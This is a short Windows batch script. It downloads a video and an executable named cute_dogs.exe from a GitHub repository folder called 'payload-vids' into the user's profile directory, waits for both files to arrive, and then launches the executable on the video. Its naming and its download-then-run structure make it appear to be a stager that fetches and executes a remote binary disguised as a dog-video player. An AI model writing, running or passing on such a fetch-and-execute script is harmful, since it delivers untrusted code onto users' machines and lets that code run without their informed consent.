@echo off

if exist "%USERPROFILE%\dog.mp4" (
    echo Video already exists, skipping download
) else (
    echo Downloading video...
    curl -o "%USERPROFILE%\dog.mp4" "https://raw.githubusercontent.com/habitatdestroyer/testing/main/payload-vids/dog.mp4"
)

if exist "%USERPROFILE%\cute_dogs.exe" (
    echo Player already exists, skipping download
) else (
    echo Downloading player...
    curl -o "%USERPROFILE%\cute_dogs.exe" "https://raw.githubusercontent.com/habitatdestroyer/testing/main/payload-vids/cute_dogs.exe"
)

:wait
if exist "%USERPROFILE%\dog.mp4" if exist "%USERPROFILE%\cute_dogs.exe" goto launch
echo Waiting for files...
timeout /t 5 /nobreak
goto wait

:launch
echo Launching...
start "" "%USERPROFILE%\cute_dogs.exe" "%USERPROFILE%\dog.mp4"